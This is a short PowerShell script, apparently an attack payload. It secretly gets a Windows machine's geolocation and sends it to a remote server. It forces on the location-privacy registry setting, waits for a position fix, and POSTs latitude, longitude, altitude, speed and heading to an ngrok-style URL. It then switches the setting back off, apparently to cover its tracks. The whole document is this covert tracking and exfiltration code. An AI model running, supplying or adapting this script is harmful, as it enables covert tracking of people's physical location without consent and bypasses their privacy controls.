Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '1'
Add-Type -AssemblyName System.Device 
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
$GeoWatcher.Start() 

$ngrokServer = 'ngrok_link/index.php'


while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 1000 
}  

if ($GeoWatcher.Permission -eq 'Denied'){
    Write-Error 'Access Denied for Location Information'
} else {
    $send = $GeoWatcher.Position.Location
    $sendData = "Latitude: $($send.Latitude) `nLongitude: $($send.Longitude) `nAltitude: $($send.altitude) `nCourse: $($send.Course) `nHorizontalAccuracy: $($send.HorizontalAccuracy) `nSpeed: $($send.Speed)"
    Start-Sleep -Milliseconds 1000 
    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $sendData
    Set-Itemproperty -path 'HKLM:\SOFTWARE\\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '0'
}
